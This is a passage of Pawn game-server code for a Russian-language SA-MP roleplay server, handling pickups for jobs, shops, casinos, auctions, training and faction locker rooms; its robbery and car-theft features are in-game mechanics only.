				RobbingBiker[robCar] = -1;
				foreach(i)
				{
					DeletePVar(i, "matovoz_rob");
					DeletePVar(i, "zapravka_rob");
				}
				RobbingBiker[robType] = -1;
	        }
	        new Float:x1, Float:y1, Float:z1;
	        GetCoordBootVehicle(RobbingBiker[bikerCar], x1, y1, z1);
	        SetPlayerCheckpointEx(playerid, x1, y1, z1, 1.5);
	        SetPVarInt(playerid, "matovoz_rob", 1);
        }
        else if(RobbingBiker[robType] == 2)
        {
            ClearAnimations(playerid);
        	ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,1,0,0,1,1,1);
			SetPlayerAttachedObject(playerid, 1 , 1650, 1,0.45,0.36,0.0,0.0,90.0, 0.0, 1.5, 1.5, 1.5);
			RobbingBiker[bresult] -= 100;
	        format(string, sizeof(string), "Кол-во груза\n%i", RobbingBiker[bresult]);
	        UpdateDynamic3DTextLabelText(Rob3DText, 0xEDEA9FAA, string);
	        if(RobbingBiker[bresult] <= 0)
	        {
				DestroyDynamicPickup(RobbingBiker[pickup]);
				RobbingBiker[pickup] = -1;
				DestroyDynamic3DTextLabel(Rob3DText);
				RobbingBiker[robCar] = -1;
	        }
	        new Float:x1, Float:y1, Float:z1;
	        GetCoordBootVehicle(RobbingBiker[bikerCar], x1, y1, z1);
	        SetPlayerCheckpointEx(playerid, x1, y1, z1, 1.5);
	        SetPVarInt(playerid, "zapravka_rob", 1);
        }
	}
	if(pickupid == exitpodeezd)
	{
		new i = GetPVarInt(playerid, "podeezd");
		new str[8], varv[100];
		strcat(varv,"Улица\n");
		for(new f = 0; f < PodeezdInfo[i][podEtazi]; f++)
		{
			format(str, 10, "%d Этаж\n", f+1);
			strcat(varv,str);
		}
		return ShowPlayerDialogEx(playerid, 6485, 2, "Лифт", varv, "Перейти", "Отмена");
	}
	if(pickupid == podeezdils)
	{
		new i = GetPVarInt(playerid, "podeezd");
		new str[8], varv[100];
		strcat(varv,"Улица\n");
		for(new f = 0; f < PodeezdInfo[i][podEtazi]; f++)
		{
			format(str, 10, "%d Этаж\n", f+1);
			strcat(varv,str);
		}
		return ShowPlayerDialogEx(playerid, 6485, 2, "Лифт", varv, "Перейти", "Отмена");
	}
	if(pickupid >= garagexit[0] && pickupid <= garagexit[3])
	{
		ShowPlayerDialogEx(playerid, 1007, 2, "Выход","Выйти на улицу\nВойти в дом", "Готово", "Отмена");
	}
	for(new i = GetVehiclePoolSize(); i >= 0; i--)
	{
		new null;
		for(new idx = 0; idx <= TOTALFARM; idx++) if(i >= FarmInfo[idx][fSeed_Car][0] && i <= FarmInfo[idx][fSeed_Car][1]) null = idx;
		if(pickupid == Farmcar_pickup[i] && null)
		{
			new Float:x, Float:y, Float:z;
			if(GetPVarInt(playerid,"farm_id") != null) return true;
			if(GetPVarInt(playerid,"farm_status") == 0)
			{
				DisablePlayerCheckpoint(playerid);
				RemovePlayerAttachedObject(playerid,3);
				GetVehiclePos(i, x, y, z);
				new Float:X12, Float:Y12, Float:Z12;
				GetXYInBackOfPlayer(playerid, X12, Y12, Z12);
				SetPlayerCheckpoint(playerid,X12+random(5),Y12+random(5),z, 1.3);
				SetPVarInt(playerid,"farm_status", 1);
				SCM(playerid,COLOR_GREEN," Для начала соберите урожай{ffffff} (( Встаньте на красный чекпоинт, и ждите 15 секунд ))");
				SCM(playerid,COLOR_GREEN," Когда соберете положите в кузов автомобиля{ffffff} (( Встаньте на желтую стрелку ))");
				SCM(playerid,COLOR_GREEN," Если захотите завершить работу, пройдите к раздевалке{ffffff} (( Встаньте на синий пикап у фермы ))");
				SCM(playerid,COLOR_GREEN," Если вы фермер, то просто сядьте в машину для завершения сбора урожая");
			}
			else if(GetPVarInt(playerid,"farm_status") == 1) return SCM(playerid, COLOR_GREY," Вы ещё не собрали урожай");
			else if(GetPVarInt(playerid,"farm_status") == 2)
			{
				if(Farmcar_prods[i] >= 1000)
				{
					SCM(playerid, COLOR_GREY," В грузовике нет места");
					Farmcar_prods[i] = 1000;
					UpdateDynamic3DTextLabelText(Farmcar_text[i], 0x5CABBDFF, "Загружено\n{ffffff}1000 / 1000");
					return true;
				}
				Farmcar_prods[i] += 5;
				SetPVarInt(playerid,"farm_zp", GetPVarInt(playerid,"farm_zp") + FarmInfo[GetPVarInt(playerid,"farm_id")][fZp]);
				format(string, 32, "~b~count:~w~%i$",GetPVarInt(playerid,"farm_zp"));
				FarmStatPay[null][2] += 5;
				FarmStatDay[null][2] += 5;
				FarmInfo[GetPVarInt(playerid,"farm_id")][fGrain_Sown] -= 5;
				GameTextForPlayer(playerid, string, 3000, 1);
				DisablePlayerCheckpoint(playerid);
				SetPVarInt(playerid,"farm_status",1);
				RemovePlayerAttachedObject(playerid,3);
				GetVehiclePos(i, x, y, z);
				new Float:X12, Float:Y12, Float:Z12;
				GetXYInBackOfPlayer(playerid, X12, Y12, Z12);
				SetPlayerCheckpoint(playerid,X12+random(5),Y12+random(5),z, 1.3);
				format(string, 64, "Загружено\n{ffffff}%i / 1000",Farmcar_prods[i]);
				Update3DTextLabelText(Farmcar_text[i], 0x5CABBDAA, string);
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 3) PlayerInfo[playerid][pQuestP] ++;
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 3 && PlayerInfo[playerid][pQuestP] == 30)
				{
					PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
					ShowPlayerDialogEx(playerid,13374,DIALOG_STYLE_MSGBOX,"Задание","Теперь у тебя есть права и деньги.Пора бы приодеться\nВ каждом городе есть магазин одежды.Доедь до него,и купи что-нибудь приличное.\nИ не забывай использовать gps\n{DDCD70}Задача: Купить любой скин\n{17B757}Награда: 1000 вирт"
					,"Готово","");
					GameTextForPlayer(playerid, "~g~+2000$", 2000, 1);
					PlayerInfo[playerid][pCash] += 2000;
					PlayerInfo[playerid][pQuest] = 4;
					PlayerInfo[playerid][pQuestP] = 0;
					PlayerInfo[playerid][pQuestPF] = 0;
					SCM(playerid,0x30a0a7aa," Задание выполнено");
					mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pQuest = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
			        PlayerInfo[playerid][pCash], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
				}
			}
		}
		if((i >= comptruck[0] && i <= comptruck[1]) && car_pickup[i] == pickupid)
		{
			if(!IsPlayerInAnyVehicle(playerid) && Works[playerid] && JobCP[playerid] == 2)
			{
				if(car_grain[i][0] >= car_grain[i][1]) return SCM(playerid,COLOR_GREY," В машине нет места"), car_grain[i][0] = car_grain[i][1];
				car_grain[i][0] += 100;
				if(car_grain[i][0] > car_grain[i][1]) car_grain[i][0] = car_grain[i][1];
				JobAmmount[playerid] ++;
				format(string,100, "Мешков перетащено: %i",JobAmmount[playerid]);
				ClearAnimations(playerid);
				ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,0,0,0,0,1,0);
				SCM(playerid,COLOR_GREEN,string);
				DisablePlayerCheckpoint(playerid);
				SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				mesh[playerid] = 0;
				usemesh[playerid] = 0;
				if(IsPlayerAttachedObjectSlotUsed(playerid,1)) RemovePlayerAttachedObject(playerid,1);
				SetPlayerCheckpoint(playerid,2230.3528,-2286.1353,14.3751,1.5);
				JobCP[playerid] = 1;
				format(string, 64, "Загружено\n{ffffff}%i / %i",car_grain[i][0],car_grain[i][1]);
				UpdateDynamic3DTextLabelText(car_text[i], 0x5CABBDAA, string);
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 1) PlayerInfo[playerid][pQuestP] ++;
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 1 && PlayerInfo[playerid][pQuestP] == 20)
				{
					PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
					ShowPlayerDialogEx(playerid,11230,DIALOG_STYLE_MSGBOX,"Задание","Это снова Вито,вижу тебе нужны права.\nУ меня есть знакомые в Автошколе,они помогут тебе сдать совершенно бесплатно.\nЧтобы добраться до Автошколы,воспользуйся Автобусом или Такси.\n{DDCD70}Задача: Пройдите автосдачу на права(Не покупкая права у инструктора!)\n{17B757}Награда: Бесплатная сдача на права"
					,"Готово","");
					GameTextForPlayer(playerid, "~g~+1000$", 2000, 1);
					PlayerInfo[playerid][pCash] += 1000;
					PlayerInfo[playerid][pQuest] = 2;
					PlayerInfo[playerid][pQuestP] = 0;
					PlayerInfo[playerid][pQuestPF] = 0;
					SCM(playerid,0x30a0a7aa," Задание выполнено");
					mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pQuest = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
			        PlayerInfo[playerid][pCash], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pName]);
                    mysql_function_query(DATABASE,QUERY,false,"","");
				}
			}
		}
	}
	for(new idx = 0; idx <= TOTALFARM; idx++)
	{
		if(pickupid == FarmInfo[idx][fPickup][0]) return ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX,"Информация о работе", "Здесь вы можете подработать сборщиком урожая.\n\nЧто бы начать работу найдите фермера,\nон все вам объяснит.\n\nНеподалеку находится раздевалка,\nтам же получать деньги.\n\nЧтобы начать работу необходимо переодеться в робу,\nдалее вам укажут, где брать груз.\n\nКак только вы захотите завершить рабочий день,\nподойдите к раздевалке.", "Ок", "");
		if(pickupid == FarmInfo[idx][fPickup][1]) return ShowPlayerDialogEx(playerid,150,DIALOG_STYLE_MSGBOX,"Раздевалка", "Вы хотите начать рабочий день, или завершить?", "Начать", "Завершить");
	}
    for(new idx = 1; idx <= TOTALSHOPS; idx++)
	{
		if(pickupid == WorkshopInfo[idx][wPickup][0])
		{
			oldpickup[playerid] = WorkshopInfo[idx][wPickup][1];
			timepickup[playerid] = 8;
			SetPlayerInterior(playerid,3);
			SetPlayerPos(playerid,WorkshopInfo[idx][wExit][0],WorkshopInfo[idx][wExit][1],WorkshopInfo[idx][wExit][2]);
			SetPlayerVirtualWorld(playerid,idx);
			GetPlayerPos(playerid, PickupX[playerid], PickupY[playerid], zx);
			return SetPlayerFacingAngle(playerid, 172.8032);
		}
		else if(pickupid == WorkshopInfo[idx][wPickup][1])
		{
			oldpickup[playerid] = WorkshopInfo[idx][wPickup][0];
			timepickup[playerid] = 8;
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,WorkshopInfo[idx][wEntr][0],WorkshopInfo[idx][wEntr][1],WorkshopInfo[idx][wEntr][2]);
			SetPlayerVirtualWorld(playerid,0);
			GetPlayerPos(playerid, PickupX[playerid], PickupY[playerid], zx);
			return SetPlayerFacingAngle(playerid, 0);
		}
		else if(pickupid == WorkshopInfo[idx][wPickup][2]) return ShowPlayerDialogEx(playerid,139,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день, или завершить?", "Начать", "Закончить");
		else if(pickupid == WorkshopInfo[idx][wPickup][3])
		{
			new str[390];
			for(new i = 9; i >= 0; i--)
			{
				if(!strlen(WorkshopList[i][idx][wlName])) format(string,30,"%i. Пусто\n",i+1);
				else format(string,30,"%i. %s[ID:%i]\n",i+1,WorkshopList[i][idx][wlName],WorkshopList[i][idx][wlID]);
				strcat(str, string);
			}
			return ShowPlayerDialogEx(playerid,10111,DIALOG_STYLE_MSGBOX, "Очередь",str, "Закрыть", "");
		}
	}
	if(pickupid == rabota1)
	{
		new rabotadialog[2148];
		format(rabotadialog,sizeof(rabotadialog), "%s%s%s%s%s%s%s%s%s%s%s%s",
		rabotaMSG[0],rabotaMSG[1],rabotaMSG[2],rabotaMSG[3],rabotaMSG[4],rabotaMSG[5],rabotaMSG[6],rabotaMSG[7],rabotaMSG[8],rabotaMSG[9],rabotaMSG[10],rabotaMSG[11]);
		ShowPlayerDialogEx(playerid,133,DIALOG_STYLE_MSGBOX, "Информация о работе", rabotadialog, "Готово", "");
	}
	else if(pickupid == ammonac[0])
	{
	    if(PlayerInfo[playerid][pGunLic] == 0) return SCM(playerid, 0x9f0000aa, " У вас нет лицензии на оружие!");
		SetPlayerInterior(playerid,7);
		SetPlayerPos(playerid,314.4596,-141.2016,999.6016);
		SetPlayerFacingAngle(playerid, 16.0505);
		SetPlayerVirtualWorld(playerid, 0);
		if(!GetPVarInt(playerid,"checkpoint")) SetPlayerCheckpoint(playerid,313.7471,-133.8828,999.6016,1.5);
		PicCP[playerid] = 3;
		RobInts[playerid] = 0;
	}
	else if(pickupid == nikname)
	{
		ShowPlayerDialogEx(playerid,10352,DIALOG_STYLE_MSGBOX, "Смена имени","Вы желаете добавить заявку на смену имени?", "Добавить", "Отмена");
		return true;
	}
	else if(pickupid == nikname2)
	{
		ShowPlayerDialogEx(playerid,10352,DIALOG_STYLE_MSGBOX, "Смена имени","Вы желаете добавить заявку на смену имени?", "Добавить", "Отмена");
		return true;
	}
	else if(pickupid == ammonac[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-2625.8115,211.2747,4.6192);
		SetPlayerFacingAngle(playerid, 171.4908);
		SetPlayerVirtualWorld(playerid,0);
		DisablePlayerCheckpoint(playerid);
		PicCP[playerid] = 0;
		RobInts[playerid] = -1;
	}
	else if(pickupid == ammonac[2])
	{
		if(PlayerInfo[playerid][pGunLic] == 0) return SCM(playerid, 0x9f0000aa, " У вас нет лицензии на оружие!");
		SetPlayerInterior(playerid,1);
		SetPlayerPos(playerid,286.4246,-39.4431,1001.5156);
		SetPlayerFacingAngle(playerid, 180.1923);
		SetPlayerVirtualWorld(playerid, 0);
		if(!GetPVarInt(playerid,"checkpoint")) SetPlayerCheckpoint(playerid,295.4419,-37.9094,1001.5156,1.5);
		PicCP[playerid] = 3;
		RobInts[playerid] = 1;
	}
	else if(pickupid == tpadminhome[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,47.7949,1001.1465,179.9551);
		SetPlayerFacingAngle(playerid, 171.4908);
	}
	else if(pickupid == tpadminhome[1])
	{
		SetPlayerInterior(playerid,1);
		SetPlayerPos(playerid,286.4246,-39.4431,1001.5156);
		SetPlayerFacingAngle(playerid, 180.1923);
	}
	else if(pickupid == ammonac[3])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,2157.0044,943.3574,10.8203);
		SetPlayerFacingAngle(playerid, 87.4521);
		SetPlayerVirtualWorld(playerid,0);
		DisablePlayerCheckpoint(playerid);
		PicCP[playerid] = 0;
		RobInts[playerid] = -1;
	}
	else if(pickupid == ammonac[4])
	{
		if(PlayerInfo[playerid][pGunLic] == 0) return SCM(playerid, 0x9f0000aa, " У вас нет лицензии на оружие!");
		SetPlayerInterior(playerid,4);
		SetPlayerPos(playerid,285.7668,-85.0216,1001.5156);
		SetPlayerFacingAngle(playerid, 357.9616);
		SetPlayerVirtualWorld(playerid, 0);
		if(!GetPVarInt(playerid,"checkpoint")) SetPlayerCheckpoint(playerid,296.9124,-80.0943,1001.5156,1.5);
		PicCP[playerid] = 3;
		RobInts[playerid] = 2;
	}
	else if(pickupid == ammonac[5])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1366.3022,-1279.4131,13.5469);
		SetPlayerFacingAngle(playerid, 87.0350);
		SetPlayerVirtualWorld(playerid,0);
		DisablePlayerCheckpoint(playerid);
		PicCP[playerid] = 0;
		RobInts[playerid] = -1;
	}
	else if(pickupid == skills[0])
	{
		SetPlayerPos(playerid,303.6031,-159.3046,999.5938);
		SetPlayerFacingAngle(playerid, 93.0350);
	}
	else if(pickupid == skills[1])
	{
		SetPlayerPos(playerid,308.4442,-160.3095,999.5938);
		SetPlayerFacingAngle(playerid, 269.0350);
	}
	else if(pickupid == caligula[0])
	{
		if(GetPVarInt(playerid,"CasinoRank")) DeletePVar(playerid,"CasinoRank"), SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
		SetPlayerPos(playerid,2192.89,1677.09,12.3672);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	else if(pickupid == RouletCloakroom[0])
	{
		if(GetPVarInt(playerid,"Fraction_Duty")) return true;
		switch(GetPVarInt(playerid,"CasinoRank"))
		{
		case 0:
			{
				if(!GetCasino(playerid,1)) return true;
				switch(PlayerInfo[playerid][pSex])
				{
				case 1:
					{
						if(GetCasino(playerid,1) == 1) SetPlayerSkin(playerid,171);
						else SetPlayerSkin(playerid,189);
					}
				case 2:
					{
						if(GetCasino(playerid,1) == 1) SetPlayerSkin(playerid,172);
						else SetPlayerSkin(playerid,194);
					}
				}
				SetPVarInt(playerid,"CasinoRank",GetCasino(playerid,1));
			}
		default:
			{
				DeletePVar(playerid,"CasinoRank");
				SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
			}
		}
		return SCM(playerid, COLOR_GREY," Вы тут не работаете");
	}
	else if(pickupid == RouletCloakroom[1])
	{
		if(GetPVarInt(playerid,"Fraction_Duty")) return true;
		switch(GetPVarInt(playerid,"CasinoRank"))
		{
		case 0:
			{
				if(!GetCasino(playerid,2)) return true;
				switch(PlayerInfo[playerid][pSex])
				{
				case 1:
					{
						if(GetCasino(playerid,2) == 1) SetPlayerSkin(playerid,171);
						else SetPlayerSkin(playerid,189);
					}
				case 2:
					{
						if(GetCasino(playerid,2) == 1) SetPlayerSkin(playerid,172);
						else SetPlayerSkin(playerid,194);
					}
				}
				SetPVarInt(playerid,"CasinoRank",GetCasino(playerid,2));
			}
		default:
			{
				DeletePVar(playerid,"CasinoRank");
				SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
			}
		}
		return SCM(playerid, COLOR_GREY," Вы тут не работаете");
	}
	else if(pickupid == caligula[2])
	{
		SetPlayerPos(playerid,2233.79,1711.64,1011.58);
		SetPlayerInterior(playerid,1);
		SetPlayerVirtualWorld(playerid,999);
	}
	else if(pickupid == monitoring) return ShowPlayerDialogEx(playerid,1755,DIALOG_STYLE_LIST,"Мониторинг бизнесов","Бары и клубы\nЗакусочные\nМагазины 24/7\nЗаправки", "Далее", "Отмена");
	else if(pickupid == auctionpic[0])
	{
		if(PlayerInfo[playerid][pLevel] < 4) return SCM(playerid, COLOR_GREY, "У вас должен быть 4 лвл для того, чтобы учавствовать в аукционах!");
		new test = 0, sctring[856],str[64],id = 0;
		for(new i = 1; i <= TotalBizz; i++) if(strcmp(BizzInfo[i][bOwner],"None",true) == 0) test++;
		if(test == 0) return SCM(playerid,COLOR_GREY," В данный момент на аукционе нет бизнесов");
		if(test > 0)
		{
			for(new i = 1; i <= TotalBizz; i++)
			{
				if(strcmp(BizzInfo[i][bOwner],"None",true) == 0)
				{
					id++;
					bizname[playerid][id] = i;
					format(str,sizeof(str), "%s\n",BizzInfo[i][bMessage]);
					strcat(sctring,str);
				}
			}
			ShowPlayerDialogEx(playerid,1667,DIALOG_STYLE_LIST,"Аукцион бизнесов",sctring, "Далее", "Отмена");
			return true;
		}
	}
	else if(pickupid == auctionpic[1])
	{
	    if(PlayerInfo[playerid][pLevel] < 4) return SCM(playerid, COLOR_GREY, "У вас должен быть 4 лвл для того, чтобы учавствовать в аукционах!");
		new null = 0, str[556],idx = 0;
		for(new i = 1; i <= TOTALSHOPS; i++) if(strcmp(WorkshopInfo[i][wOwner],"None",true) == 0) null++;
		for(new i = 0; i <= TOTALFARM; i++) if(strcmp(FarmInfo[i][fOwner],"None",true) == 0) null++;
		if(null == 0) return SCM(playerid,COLOR_GREY," В данный момент на аукционе нет бизнесов");
		for(new i = 1; i <= TOTALFARM; i++)
		{
			if(strcmp(FarmInfo[i][fOwner],"None",true) != 0) continue;
			bizname[playerid][idx] = i;
			format(YCMDstr,64, "Ферма[%i]\n",FarmInfo[i][fID]-1);
			strcat(str,YCMDstr);
			auction_info[idx] = 2;
			idx++;
		}
		for(new i = 1; i <= TOTALSHOPS; i++)
		{
			if(strcmp(WorkshopInfo[i][wOwner],"None",true) != 0) continue;
			bizname[playerid][idx] = i;
			format(YCMDstr,64, "СТО[%i]\n",WorkshopInfo[i][wID]-1);
			strcat(str,YCMDstr);
			auction_info[idx] = 1;
			idx++;
		}
		return ShowPlayerDialogEx(playerid,1690,DIALOG_STYLE_LIST,"Аукцион Ферм и СТО",str, "Далее", "Закрыть");
	}
	else if(pickupid == pickcars[4])
	{
		if(avtocar[playerid] != 0) return ShowPlayerDialogEx(playerid,1336,DIALOG_STYLE_MSGBOX,"Автоугонщик"," Вы уже взяли контракт\nВы хотите его отменить?", "Да", "Отмена");
		if(!IsAGang(playerid) && !IsABiker(playerid) && !IsAMafia(playerid) && PlayerInfo[playerid][pMember] != 0) return SCM(playerid,COLOR_GREY," Вы состоите во фракции!");
		if(PlayerInfo[playerid][pJob] != 65) return ShowPlayerDialogEx(playerid,1335,DIALOG_STYLE_MSGBOX,"Автоугонщик","Ты хочешь работать у нас?", "Устроиться", "Отмена");
		ShowPlayerDialogEx(playerid,1334,DIALOG_STYLE_LIST,"Выбор автомобиля","Nope Class\nB Class\nA Class", "Выбор", "Отмена");
	}
	else if(pickupid >= pickcars[0] && pickupid <= pickcars[3])
	{
		if(PlayerInfo[playerid][pJob] != 65) return SCM(playerid,COLOR_BLUE, " Уйди!!! Не дай бог стуканёш копам!");
		if(tookmoped[playerid] != 0) DestroyVehicle(tookmoped[playerid]);
		new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid,x,y,z);
		tookmoped[playerid] = CreateVehicle(462,x,y,z,1,0,0, 300);
		PutPlayerInVehicleEx(playerid, tookmoped[playerid], 0);
		SetPlayerArmedWeapon(playerid,0);
		Fuell[tookmoped[playerid]] = 100;
		UnLockCar(playerid,tookmoped[playerid]);
		return 1;
	}
	else if(pickupid == dragons[0])
	{
		if(GetPVarInt(playerid,"CasinoRank")) DeletePVar(playerid,"CasinoRank"), SetPlayerSkin(playerid,PlayerInfo[playerid][pChar][0]);
		SetPlayerPos(playerid,2022.8,1007.89,10.8203);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
	}
	else if(pickupid == dragons[1])
	{
		SetPlayerPos(playerid,2016.04,1017.97,996.875);
		SetPlayerInterior(playerid,10);
		SetPlayerVirtualWorld(playerid,1);
	}
	else if(pickupid == rob)
	{
		if(robh[playerid] != true)return SCM(playerid,COLOR_GREY," У вас нет с собой металла");
		robh[playerid] = false;
		PlayerInfo[playerid][pCash] += 500;
		PlayerInfo[playerid][pRobHouse] = 1;
		SCM(playerid,COLOR_GREY," Вы сдали ограбленное на 500 вирт");
		return true;
	}
	else if(pickupid == sportfrac)
	{
		if(training[playerid] != 0)
		{
			SetPlayerSkin(playerid,OldSkin[playerid]);
			SetPlayerFightingStyle (playerid, FIGHT_STYLE_GRABKICK);
			SCM(playerid,TEAM_GROVE_COLOR," Вы закончили тренировку");
			return training[playerid] = 0;
		}
		switch(PlayerInfo[playerid][pTraining])
		{
		case 0:
			{
				OldSkin[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid,81);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
				SCM(playerid,TEAM_GROVE_COLOR," Вы начали тренировку");
				SCM(playerid,TEAM_GROVE_COLOR," Для повышения навыка,наносите удары по груше. Чем разнообразнее удары,тем быстрее растет навык.");
				training[playerid] = 1;
			}
		case 1:
			{
				OldSkin[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid,81);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
				SCM(playerid,TEAM_GROVE_COLOR," Вы начали тренировку");
				SCM(playerid,TEAM_GROVE_COLOR," Найдите себе соперника и тренера который устроит вам поединок!");
				SCM(playerid,TEAM_GROVE_COLOR," Чтобы обладать стилем бокса,вы должны одержать победу в 2-х боях");
				training[playerid] = 2;
			}
		case 2:
			{
				OldSkin[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid,81);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
				SCM(playerid,TEAM_GROVE_COLOR," Вы начали тренировку");
				SCM(playerid,TEAM_GROVE_COLOR," Для повышения навыка,наносите удары по груше. Чем разнообразнее удары,тем быстрее растет навык.");
				training[playerid] = 3;
			}
		case 3:
			{
				OldSkin[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid,81);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD);
				SCM(playerid,TEAM_GROVE_COLOR," Вы начали тренировку");
				SCM(playerid,TEAM_GROVE_COLOR," Найдите себе соперника и тренера который устроит вам поединок!");
				SCM(playerid,TEAM_GROVE_COLOR," Чтобы обладать стилем кик-бокса,вы должны одержать победу в 2-х боях");
				training[playerid] = 4;
			}
		case 4:
			{
				OldSkin[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid,81);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
				SCM(playerid,TEAM_GROVE_COLOR," Вы начали тренировку");
				SCM(playerid,TEAM_GROVE_COLOR," Для повышения навыка,наносите удары по груше. Чем разнообразнее удары,тем быстрее растет навык.");
				training[playerid] = 5;
			}
		case 5:
			{
				OldSkin[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid,81);
				SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU);
				SCM(playerid,TEAM_GROVE_COLOR," Вы начали тренировку");
				SCM(playerid,TEAM_GROVE_COLOR," Найдите себе соперника и тренера который устроит вам поединок!");
				SCM(playerid,TEAM_GROVE_COLOR," Чтобы обладать стилем кик-бокса,вы должны одержать победу в 2-х боях");
				training[playerid] = 6;
			}
		}
	}
	else if(pickupid == FormaFracPic[0])
	{
		if(PlayerInfo[playerid][pMember] == 1)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[1])
	{
		if(PlayerInfo[playerid][pMember] == 2)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[2])
	{
		if(PlayerInfo[playerid][pMember] == 3)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[3] || pickupid == FormaFracPic[12] || pickupid == FormaFracPic[13] || pickupid == FormaFracPic[14] || pickupid == FormaFracPic[15])
	{
		if(PlayerInfo[playerid][pMember] == 4)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[4])
	{
		if(PlayerInfo[playerid][pMember] == 7)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[5])
	{
		if(PlayerInfo[playerid][pMember] == 9)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
			else ShowPlayerDialogEx(playerid,1011,DIALOG_STYLE_LIST, "Раздевалка", "Завершить рабочий день\nСменить одежду", "Далее", "Отмена");
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вы не работаете в данной организации");
		}
	}
	else if(pickupid == FormaFracPic[6])
	{
		if(PlayerInfo[playerid][pMember] == 10)
		{
			if(!GetPVarInt(playerid,"Fraction_Duty")) ShowPlayerDialogEx(playerid,1010,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день?", "Да", "Нет");
